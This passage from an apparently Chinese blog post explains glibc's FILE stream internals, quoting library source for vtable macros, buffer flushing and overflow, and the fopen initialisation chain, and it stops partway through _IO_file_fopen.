<h3 id="比较重要的宏（libioP-h）"><a href="#比较重要的宏（libioP-h）" class="headerlink" title="比较重要的宏（libioP.h）"></a>比较重要的宏（libioP.h）</h3><blockquote>
<p>以上述函数所用举例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(FP, BUFFER, LENGTH) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="comment">/*以下为了得到虚表指针*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br><span class="line"><span class="comment">/* Offset of member MEMBER in a struct of type TYPE. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) __builtin_offsetof (TYPE, MEMBER)</span></span><br></pre></td></tr></table></figure>

<h3 id="最终跳表函数的实现（fileops-c）"><a href="#最终跳表函数的实现（fileops-c）" class="headerlink" title="最终跳表函数的实现（fileops.c）"></a>最终跳表函数的实现（fileops.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">	_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">	_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IO-flush-all-lockp-int-do-lock"><a href="#IO-flush-all-lockp-int-do-lock" class="headerlink" title="_IO_flush_all_lockp (int do_lock)"></a>_IO_flush_all_lockp (int do_lock)</h2><blockquote>
<p>刷新文件流</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="库内公共接口函数的实现流程示例"><a href="#库内公共接口函数的实现流程示例" class="headerlink" title="库内公共接口函数的实现流程示例"></a>库内公共接口函数的实现流程示例</h1><blockquote>
<p>对genops.c的二次封装</p>
</blockquote>
<h2 id="1-fopen为例"><a href="#1-fopen为例" class="headerlink" title="1. fopen为例"></a>1. fopen为例</h2><blockquote>
<p>主要实现流程，具体函数实现有兴趣的自行观看吧。</p>
</blockquote>
<h3 id="a-fopen-internal（iofopen-c）"><a href="#a-fopen-internal（iofopen-c）" class="headerlink" title="a. __fopen_internal（iofopen.c）"></a>a. __fopen_internal（iofopen.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="b-IO-no-init-and-IO-old-init（genops-c）"><a href="#b-IO-no-init-and-IO-old-init（genops-c）" class="headerlink" title="b. _IO_no_init and _IO_old_init（genops.c）"></a>b. _IO_no_init and _IO_old_init（genops.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">	     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c-IO-new-file-init-internal-fileops-c"><a href="#c-IO-new-file-init-internal-fileops-c" class="headerlink" title="c._IO_new_file_init_internal(fileops.c)"></a>c._IO_new_file_init_internal(fileops.c)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="d-IO-new-file-init-internal-fileops-c"><a href="#d-IO-new-file-init-internal-fileops-c" class="headerlink" title="d._IO_new_file_init_internal(fileops.c)"></a>d._IO_new_file_init_internal(fileops.c)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">		    <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">	  omode = O_RDWR;</span><br><span class="line">	  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">	  oflags |= O_EXCL;</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">	  oflags |= O_CLOEXEC;</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* Ignore.  */</span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">			  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">	     to wide.  */</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">	  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">	  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">	      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">	      __set_errno (malloc_err);</span><br><span class="line">	      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">				   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment">		 This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment">		 for these.  */</span></span><br><span class="line">	      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">	      <span class="built_in">free</span> (ccs);</span><br><span class="line">	      __set_errno (EINVAL);</span><br><span class="line">	      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">	  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">	  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">	  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">	  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">	  